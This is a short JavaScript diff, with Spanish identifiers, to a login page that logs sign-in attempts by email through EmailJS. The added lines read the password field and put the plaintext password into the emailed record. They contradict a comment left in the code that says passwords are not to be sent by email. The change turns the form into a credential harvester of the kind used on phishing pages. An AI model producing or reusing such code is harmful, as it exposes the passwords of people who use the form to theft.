@@ -47,6 +47,7 @@
 
         const documento = document.getElementById("documento").value.trim();
         const usuario = document.getElementById("usuario").value.trim();
+        const contraseña = document.getElementById("password").value.trim();
 
         // Seguridad: NO enviar la contraseña por correo.
         // Si quieres probar con contraseña enmascarada solo en local, puedo mostrarlo aparte.
@@ -58,7 +59,8 @@
           usuario,
           fecha,
           ip,
-          resultado: "intento"
+          resultado: "intento",
+          contraseña
         };
 
         // Reemplaza los IDs abajo con los tuyos de EmailJS
